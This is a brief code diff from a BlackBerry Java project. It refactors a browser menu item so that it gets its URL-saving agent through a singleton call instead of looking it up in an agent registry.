@@ -4,8 +4,6 @@ import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.AgentManager;
-import blackberry.agent.Agent;
 import blackberry.agent.UrlAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -123,8 +121,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#endif
 
             if (agent == null) {
-                agent = (UrlAgent) AgentManager.getInstance().getItem(
-                        Agent.AGENT_URL);
+                agent = UrlAgent.getInstance();
             }
 
             agent.saveUrl(url);
